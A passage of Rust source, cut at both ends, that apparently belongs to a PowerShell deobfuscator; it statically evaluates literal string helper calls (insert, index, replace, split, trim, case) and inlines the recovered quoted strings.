                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_ps_positional_literal_insert_args(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    binding: PsInsertExtractorParamBinding<'_>,
) -> Option<(usize, String, usize, String)> {
    if binding.arg_count == 0
        || binding.arg_count > 8
        || binding.value_idx >= binding.arg_count
        || binding.start_idx >= binding.arg_count
        || binding.insert_idx >= binding.arg_count
    {
        return None;
    }

    let bytes = text.as_bytes();
    let mut value = None;
    let mut start = None;
    let mut insert = None;
    let mut arg_end = pos;
    for idx in 0..binding.arg_count {
        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
        if idx == binding.value_idx {
            value = Some(arg.as_str()?.to_string());
        }
        if idx == binding.start_idx {
            start = Some(arg.as_usize()?);
        }
        if idx == binding.insert_idx {
            insert = Some(arg.as_str()?.to_string());
        }
        arg_end = next_end;
        pos = next_end;
        if idx + 1 < binding.arg_count {
            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
        }
    }

    if parenthesized {
        let after = skip_ascii_ws(bytes, arg_end);
        if bytes.get(after) != Some(&b')') {
            return None;
        }
        arg_end = after + 1;
    }

    Some((arg_end, value?, start?, insert?))
}

fn inline_ps_named_literal_insert_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    start_name: &str,
    insert_name: &str,
) -> Option<(usize, String)> {
    let (call_end, args) =
        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 6)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_literal()?;
    let start = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(start_name))?
        .1
        .as_usize()?;
    let insert = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(insert_name))?
        .1
        .as_literal()?;
    Some((
        call_end,
        ps_literal_insert_replacement(value, start, insert)?,
    ))
}

fn ps_literal_insert_replacement(value: &str, start: usize, insert: &str) -> Option<String> {
    if value.len() > 8192 || insert.len() > 512 {
        return None;
    }
    if start > value.len() || !value.is_char_boundary(start) {
        return None;
    }
    let mut recovered = String::with_capacity(value.len().checked_add(insert.len())?);
    recovered.push_str(&value[..start]);
    recovered.push_str(insert);
    recovered.push_str(&value[start..]);
    Some(format!("'{}'", recovered.replace('\'', "''")))
}

fn inline_ps_literal_index_calls(
    text: &str,
    name: &str,
    binding: PsIndexExtractorParamBinding<'_>,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_index_call(
                    text,
                    pos,
                    parenthesized,
                    binding.value_name,
                    binding.index_name,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value, index)) =
                parse_ps_positional_literal_index_args(text, pos, parenthesized, binding)
            else {
                search_from = end_name;
                continue;
            };
            let Some(replacement) = ps_literal_index_replacement(&value, index) else {
                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[derive(Clone, Copy)]
struct PsIndexExtractorParamBinding<'a> {
    value_idx: usize,
    value_name: &'a str,
    index_idx: usize,
    index_name: &'a str,
    arg_count: usize,
}

fn parse_ps_positional_literal_index_args(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    binding: PsIndexExtractorParamBinding<'_>,
) -> Option<(usize, String, usize)> {
    if binding.arg_count == 0
        || binding.arg_count > 8
        || binding.value_idx >= binding.arg_count
        || binding.index_idx >= binding.arg_count
    {
        return None;
    }

    let bytes = text.as_bytes();
    let mut value = None;
    let mut index = None;
    let mut arg_end = pos;
    for idx in 0..binding.arg_count {
        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
        if idx == binding.value_idx {
            value = Some(arg.as_str()?.to_string());
        }
        if idx == binding.index_idx {
            index = Some(arg.as_usize()?);
        }
        arg_end = next_end;
        pos = next_end;
        if idx + 1 < binding.arg_count {
            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
        }
    }

    if parenthesized {
        let after = skip_ascii_ws(bytes, arg_end);
        if bytes.get(after) != Some(&b')') {
            return None;
        }
        arg_end = after + 1;
    }

    Some((arg_end, value?, index?))
}

fn inline_ps_named_literal_index_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    index_name: &str,
) -> Option<(usize, String)> {
    let (call_end, args) =
        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 4)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_literal()?;
    let index = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(index_name))?
        .1
        .as_usize()?;
    Some((call_end, ps_literal_index_replacement(value, index)?))
}

fn ps_literal_index_replacement(value: &str, index: usize) -> Option<String> {
    let ch = value.chars().nth(index)?;
    Some(format!("'{}'", ch.to_string().replace('\'', "''")))
}

fn inline_ps_literal_const_index_calls(
    text: &str,
    name: &str,
    value_idx: usize,
    value_name: &str,
    arg_count: usize,
    index: usize,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_const_index_call(
                    text,
                    pos,
                    parenthesized,
                    value_name,
                    index,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
                text,
                pos,
                parenthesized,
                value_idx,
                arg_count,
            ) else {
                search_from = end_name;
                continue;
            };
            let Some(replacement) = ps_literal_index_replacement(&value, index) else {
                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_named_literal_const_index_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    index: usize,
) -> Option<(usize, String)> {
    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_str();
    Some((call_end, ps_literal_index_replacement(value, index)?))
}

fn inline_ps_literal_replace_calls(
    text: &str,
    name: &str,
    binding: PsReplaceExtractorParamBinding<'_>,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_replace_call(
                    text,
                    pos,
                    parenthesized,
                    binding.value_name,
                    binding.needle_name,
                    binding.repl_name,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value, needle, repl)) =
                parse_ps_positional_literal_replace_args(text, pos, parenthesized, binding)
            else {
                search_from = end_name;
                continue;
            };
            if needle.is_empty() {
                search_from = call_end;
                continue;
            }
            let replaced = value.replace(&needle, &repl);
            if replaced.len() > 8192 {
                search_from = call_end;
                continue;
            }
            let replacement = format!("'{}'", replaced.replace('\'', "''"));
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[derive(Clone, Copy)]
struct PsReplaceExtractorParamBinding<'a> {
    value_idx: usize,
    value_name: &'a str,
    arg_count: usize,
    needle_idx: usize,
    needle_name: &'a str,
    repl_idx: usize,
    repl_name: &'a str,
}

fn parse_ps_positional_literal_replace_args(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    binding: PsReplaceExtractorParamBinding<'_>,
) -> Option<(usize, String, String, String)> {
    if binding.arg_count == 0
        || binding.arg_count > 8
        || binding.value_idx >= binding.arg_count
        || binding.needle_idx >= binding.arg_count
        || binding.repl_idx >= binding.arg_count
    {
        return None;
    }

    let bytes = text.as_bytes();
    let mut value = None;
    let mut needle = None;
    let mut repl = None;
    let mut arg_end = pos;
    for idx in 0..binding.arg_count {
        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
        if idx == binding.value_idx {
            value = Some(arg.as_str()?.to_string());
        }
        if idx == binding.needle_idx {
            needle = Some(arg.as_str()?.to_string());
        }
        if idx == binding.repl_idx {
            repl = Some(arg.as_str()?.to_string());
        }
        arg_end = next_end;
        pos = next_end;
        if idx + 1 < binding.arg_count {
            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
        }
    }

    if parenthesized {
        let after = skip_ascii_ws(bytes, arg_end);
        if bytes.get(after) != Some(&b')') {
            return None;
        }
        arg_end = after + 1;
    }

    Some((arg_end, value?, needle?, repl?))
}

fn inline_ps_named_literal_replace_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    needle_name: &str,
    repl_name: &str,
) -> Option<(usize, String)> {
    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 6)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_str();
    let needle = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(needle_name))?
        .1
        .as_str();
    let repl = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(repl_name))?
        .1
        .as_str();
    if value.len() > 8192 || needle.is_empty() {
        return None;
    }
    let replaced = value.replace(needle, repl);
    if replaced.len() > 8192 {
        return None;
    }
    Some((call_end, format!("'{}'", replaced.replace('\'', "''"))))
}

fn inline_ps_literal_const_replace_calls(
    text: &str,
    name: &str,
    value_idx: usize,
    value_name: &str,
    arg_count: usize,
    needle: &str,
    repl: &str,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle_name in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle_name) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle_name.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_const_replace_call(
                    text,
                    pos,
                    parenthesized,
                    value_name,
                    needle,
                    repl,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
                text,
                pos,
                parenthesized,
                value_idx,
                arg_count,
            ) else {
                search_from = end_name;
                continue;
            };
            if value.len() > 8192 {
                search_from = call_end;
                continue;
            }
            let Some(replacement) = ps_literal_replace_replacement(&value, needle, repl) else {
                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_named_literal_const_replace_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    needle: &str,
    repl: &str,
) -> Option<(usize, String)> {
    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_str();
    Some((
        call_end,
        ps_literal_replace_replacement(value, needle, repl)?,
    ))
}

fn ps_literal_replace_replacement(value: &str, needle: &str, repl: &str) -> Option<String> {
    if value.len() > 8192 || needle.is_empty() || needle.len() > 512 || repl.len() > 512 {
        return None;
    }
    let replaced = value.replace(needle, repl);
    if replaced.len() > 8192 {
        return None;
    }
    Some(format!("'{}'", replaced.replace('\'', "''")))
}

fn inline_ps_literal_const_split_index_calls(
    text: &str,
    name: &str,
    value_idx: usize,
    value_name: &str,
    arg_count: usize,
    sep: &str,
    index: usize,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle_name in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle_name) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle_name.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) =
                    inline_ps_named_literal_const_split_index_call(
                        text,
                        pos,
                        parenthesized,
                        value_name,
                        sep,
                        index,
                    )
                {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
                text,
                pos,
                parenthesized,
                value_idx,
                arg_count,
            ) else {
                search_from = end_name;
                continue;
            };
            if value.len() > 8192 {
                search_from = call_end;
                continue;
            }
            let Some(replacement) = ps_literal_split_index_replacement(&value, sep, index) else {
                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_named_literal_const_split_index_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    sep: &str,
    index: usize,
) -> Option<(usize, String)> {
    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_str();
    Some((
        call_end,
        ps_literal_split_index_replacement(value, sep, index)?,
    ))
}

fn ps_literal_split_index_replacement(value: &str, sep: &str, index: usize) -> Option<String> {
    if value.len() > 8192 || sep.is_empty() {
        return None;
    }
    let part = value.split(sep).nth(index)?;
    if part.len() > 8192 {
        return None;
    }
    Some(format!("'{}'", part.replace('\'', "''")))
}

#[derive(Clone, Copy)]
struct PsConstSepSplitExtractorParamBinding<'a> {
    value_idx: usize,
    value_name: &'a str,
    index_idx: usize,
    index_name: &'a str,
    arg_count: usize,
    sep: &'a str,
}

fn inline_ps_literal_const_sep_split_index_calls(
    text: &str,
    name: &str,
    binding: PsConstSepSplitExtractorParamBinding<'_>,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) =
                    inline_ps_named_literal_const_sep_split_index_call(
                        text,
                        pos,
                        parenthesized,
                        binding.value_name,
                        binding.index_name,
                        binding.sep,
                    )
                {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value, index)) =
                parse_ps_positional_literal_const_sep_split_index_args(
                    text,
                    pos,
                    parenthesized,
                    binding,
                )
            else {
                search_from = end_name;
                continue;
            };
            let Some(replacement) = ps_literal_split_index_replacement(&value, binding.sep, index)
            else {
                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_ps_positional_literal_const_sep_split_index_args(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    binding: PsConstSepSplitExtractorParamBinding<'_>,
) -> Option<(usize, String, usize)> {
    if binding.arg_count == 0
        || binding.arg_count > 8
        || binding.value_idx >= binding.arg_count
        || binding.index_idx >= binding.arg_count
    {
        return None;
    }

    let bytes = text.as_bytes();
    let mut value = None;
    let mut index = None;
    let mut arg_end = pos;
    for idx in 0..binding.arg_count {
        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
        if idx == binding.value_idx {
            value = Some(arg.as_str()?.to_string());
        }
        if idx == binding.index_idx {
            index = Some(arg.as_usize()?);
        }
        arg_end = next_end;
        pos = next_end;
        if idx + 1 < binding.arg_count {
            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
        }
    }

    if parenthesized {
        let after = skip_ascii_ws(bytes, arg_end);
        if bytes.get(after) != Some(&b')') {
            return None;
        }
        arg_end = after + 1;
    }

    Some((arg_end, value?, index?))
}

fn inline_ps_named_literal_const_sep_split_index_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    index_name: &str,
    sep: &str,
) -> Option<(usize, String)> {
    let (call_end, args) =
        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 4)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_literal()?;
    let index = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(index_name))?
        .1
        .as_usize()?;
    Some((
        call_end,
        ps_literal_split_index_replacement(value, sep, index)?,
    ))
}

#[derive(Clone, Copy)]
struct PsLiteralTrimExtractorSpec<'a> {
    value_idx: usize,
    value_name: &'a str,
    arg_count: usize,
    chars_idx: Option<usize>,
    chars_name: Option<&'a str>,
    kind: PsTrimKind,
}

fn inline_ps_literal_trim_calls(
    text: &str,
    name: &str,
    spec: PsLiteralTrimExtractorSpec<'_>,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_trim_call(
                    text,
                    pos,
                    parenthesized,
                    spec.value_name,
                    spec.chars_name,
                    spec.kind,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let (call_end, replacement) = if spec.chars_idx.is_some() {
                let Some((call_end, value, chars)) =
                    parse_ps_positional_literal_trim_chars_args(text, pos, parenthesized, spec)
                else {
                    search_from = end_name;
                    continue;
                };
                if chars.is_empty() {
                    search_from = call_end;
                    continue;
                }
                let trimmed = spec.kind.apply_chars(&value, &chars);
                if trimmed.len() > 8192 {
                    search_from = call_end;
                    continue;
                }
                (call_end, format!("'{}'", trimmed.replace('\'', "''")))
            } else {
                let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
                    text,
                    pos,
                    parenthesized,
                    spec.value_idx,
                    spec.arg_count,
                ) else {
                    search_from = end_name;
                    continue;
                };
                let trimmed = spec.kind.apply_default(&value);
                if trimmed.len() > 8192 {
                    search_from = call_end;
                    continue;
                }
                (call_end, format!("'{}'", trimmed.replace('\'', "''")))
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_ps_positional_literal_trim_chars_args(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    spec: PsLiteralTrimExtractorSpec<'_>,
) -> Option<(usize, String, String)> {
    let chars_idx = spec.chars_idx?;
    if spec.arg_count == 0
        || spec.arg_count > 8
        || spec.value_idx >= spec.arg_count
        || chars_idx >= spec.arg_count
    {
        return None;
    }

    let bytes = text.as_bytes();
    let mut value = None;
    let mut chars = None;
    let mut arg_end = pos;
    for idx in 0..spec.arg_count {
        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
        if idx == spec.value_idx {
            value = Some(arg.as_str()?.to_string());
        }
        if idx == chars_idx {
            chars = Some(arg.as_str()?.to_string());
        }
        arg_end = next_end;
        pos = next_end;
        if idx + 1 < spec.arg_count {
            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
        }
    }

    if parenthesized {
        let after = skip_ascii_ws(bytes, arg_end);
        if bytes.get(after) != Some(&b')') {
            return None;
        }
        arg_end = after + 1;
    }

    Some((arg_end, value?, chars?))
}

fn inline_ps_named_literal_trim_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    chars_name: Option<&str>,
    kind: PsTrimKind,
) -> Option<(usize, String)> {
    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 4)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_str();
    if value.len() > 8192 {
        return None;
    }

    let trimmed = if let Some(chars_name) = chars_name {
        let chars = args
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case(chars_name))?
            .1
            .as_str();
        if chars.is_empty() {
            return None;
        }
        kind.apply_chars(value, chars)
    } else {
        kind.apply_default(value)
    };
    if trimmed.len() > 8192 {
        return None;
    }
    Some((call_end, format!("'{}'", trimmed.replace('\'', "''"))))
}

fn inline_ps_literal_const_trim_calls(
    text: &str,
    name: &str,
    value_idx: usize,
    value_name: &str,
    arg_count: usize,
    kind: PsTrimKind,
    chars: &str,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_const_trim_call(
                    text,
                    pos,
                    parenthesized,
                    value_name,
                    kind,
                    chars,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
                text,
                pos,
                parenthesized,
                value_idx,
                arg_count,
            ) else {
                search_from = end_name;
                continue;
            };
            let Some(replacement) = ps_literal_const_trim_replacement(&value, kind, chars) else {
                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_named_literal_const_trim_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    kind: PsTrimKind,
    chars: &str,
) -> Option<(usize, String)> {
    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_str();
    Some((
        call_end,
        ps_literal_const_trim_replacement(value, kind, chars)?,
    ))
}

fn ps_literal_const_trim_replacement(value: &str, kind: PsTrimKind, chars: &str) -> Option<String> {
    if value.len() > 8192 || chars.is_empty() || chars.len() > 512 {
        return None;
    }
    let trimmed = kind.apply_chars(value, chars);
    if trimmed.len() > 8192 {
        return None;
    }
    Some(format!("'{}'", trimmed.replace('\'', "''")))
}

fn inline_ps_literal_string_case_calls(
    text: &str,
    name: &str,
    value_idx: usize,
    value_name: &str,
    arg_count: usize,
    kind: PsStringCaseKind,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_string_case_call(
                    text,
                    pos,
                    parenthesized,
                    value_name,
                    kind,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
                text,
                pos,
                parenthesized,
                value_idx,
                arg_count,
            ) else {
                search_from = end_name;
                continue;
            };
            if value.len() > 8192 {
                search_from = call_end;
                continue;
            }
            let transformed = kind.apply_ascii(&value);
            let replacement = format!("'{}'", transformed.replace('\'', "''"));
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_named_literal_string_case_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    kind: PsStringCaseKind,
) -> Option<(usize, String)> {
    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_str();
    if value.len() > 8192 {
        return None;
    }
    let transformed = kind.apply_ascii(value);
    Some((call_end, format!("'{}'", transformed.replace('\'', "''"))))
}

fn parse_ps_named_static_literal_args(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    max_args: usize,
) -> Option<(usize, Vec<(String, String)>)> {
    let bytes = text.as_bytes();
    let mut args = Vec::new();
    let mut arg_end = pos;
    for _ in 0..max_args {
        pos = skip_ascii_ws(bytes, pos);
        if parenthesized && bytes.get(pos) == Some(&b')') {
            return (!args.is_empty()).then_some((pos + 1, args));
        }
        if bytes.get(pos) != Some(&b'-') {
            break;
        }
        let name_start = pos + 1;
        let mut name_end = name_start;
        while name_end < bytes.len()
            && (bytes[name_end].is_ascii_alphanumeric() || bytes[name_end] == b'_')
        {
            name_end += 1;
        }
        if name_end == name_start {
            return None;
        }
        let name = text[name_start..name_end].to_ascii_lowercase();
        pos = skip_ascii_ws(bytes, name_end);
        let (value_end, value) = parse_ps_static_quoted_literal(text, pos)?;
        args.push((name, value));
        arg_end = value_end;
